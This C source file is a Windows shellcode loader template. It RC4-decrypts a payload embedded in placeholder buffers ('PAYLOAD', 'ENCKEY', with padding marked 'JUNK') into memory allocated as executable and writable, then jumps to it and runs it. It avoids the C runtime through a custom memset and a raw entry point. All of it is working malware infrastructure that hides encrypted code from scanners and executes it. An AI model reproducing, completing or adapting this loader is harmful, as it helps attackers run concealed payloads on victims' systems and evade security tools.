#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <memory.h>

#define N 256   // 2^8

void swap(unsigned char* a, unsigned char* b) {
    int tmp = *a;
    *a = *b;
    *b = tmp;
}

int KSA(char* key, unsigned char* S) {
    size_t len = strlen(key);
    int j = 0;

    for (int i = 0; i < N; i++) {
        S[i] = i;
    }

    for (int i = 0; i < N; i++) {
        j = (j + S[i] + key[i % len]) % N;
        swap(&S[i], &S[j]);
    }

    return 0;
}

int PRGA(unsigned char* S, char* plaintext, unsigned char* ciphertext, int plainTextSize) {
    int i = 0;
    int j = 0;

    for (size_t n = 0, len = plainTextSize; n < len; n++) {
        i = (i + 1) % N;
        j = (j + S[i]) % N;
        swap(&S[i], &S[j]);
        int rnd = S[(S[i] + S[j]) % N];
        ciphertext[n] = rnd ^ plaintext[n];
    }

    return 0;
}

int RC4(char* key, char* plaintext, unsigned char* ciphertext, int plainTextSize) {
    unsigned char S[N];
    KSA(key, S);
    PRGA(S, plaintext, ciphertext, plainTextSize);
    return 0;
}

#pragma function(memset)
void* __cdecl  memset(_Out_writes_bytes_all_(count) void* dest, _In_ int c, _In_ size_t count) {
    unsigned char* p = (unsigned char*)dest;
    unsigned char x = c & 0xff;

    while (count--)
        *p++ = x;
    return dest;
}

// The future embedded payload will have the following format:
// TOTAL_SIZE (uint) + PAYLOAD + JUNK
// These constants must match the constants defined in the module
#define MAX_PAYLOAD_SIZE 8192
#define MAX_JUNK_SIZE 1024
#define MAX_KEY_SIZE 64

static unsigned char payload[sizeof(unsigned int) + MAX_PAYLOAD_SIZE + MAX_JUNK_SIZE] = "PAYLOAD";
static unsigned char key[MAX_KEY_SIZE + 1] = "ENCKEY"; // reserve one byte for the terminating NULL character

int WINAPI WinMainCRTStartup(void)
{
    unsigned int* lpBufSize = (unsigned int*)payload;
    char* payloadValue = (char*)(payload + sizeof(unsigned int));
    LPVOID lpBuf = VirtualAlloc(NULL, *lpBufSize, MEM_COMMIT, 0x00000040);
    memset(lpBuf, '\0', *lpBufSize);

    RC4((char *)key, payloadValue, (unsigned char*)lpBuf, *lpBufSize);
    void (*func)();
    func = (void (*)()) lpBuf;
    (void)(*func)();

    return 0;
}
